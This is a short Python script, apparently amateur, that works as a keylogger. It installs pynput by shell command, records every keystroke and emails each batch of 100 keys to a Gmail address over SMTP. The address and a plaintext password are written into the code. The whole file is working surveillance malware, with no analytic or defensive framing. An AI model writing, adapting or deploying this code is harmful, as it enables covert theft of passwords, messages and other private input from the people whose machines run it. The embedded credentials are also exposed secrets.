import subprocess
import smtplib, ssl
subprocess.run("cd ~/ ;pip install pynput",shell=True)
from pynput import keyboard
def keylogger():
    global keys
    keys = []
    def on_press(key):
        global keys
        try:
            keys.append(format(key.char))
            print(len(keys))
            if len(keys)>100:

                liste = list(keys)
                keys = []
                envoi_mail(liste)
                print(liste)
        except AttributeError:
            keys.append(format(key)[4:])
            if len(keys)>100:
                liste = list(keys)
                keys = []
                envoi_mail(liste)
                print(liste)


    # Collect events until released
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def envoi_mail(tableau):
    sender_email = "testestest128128@gmail.com"
    receiver_email = "testestest128128@gmail.com"
    message = """\
    Subject: Hi there

    """ + str(tableau)

    port = 465  # For SSL
    password = "leo128UL"
    # Create a secure SSL context
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login("testestest128128@gmail.com", password)
        server.sendmail(sender_email, receiver_email, message)

    # TODO: Send email here

keylogger()
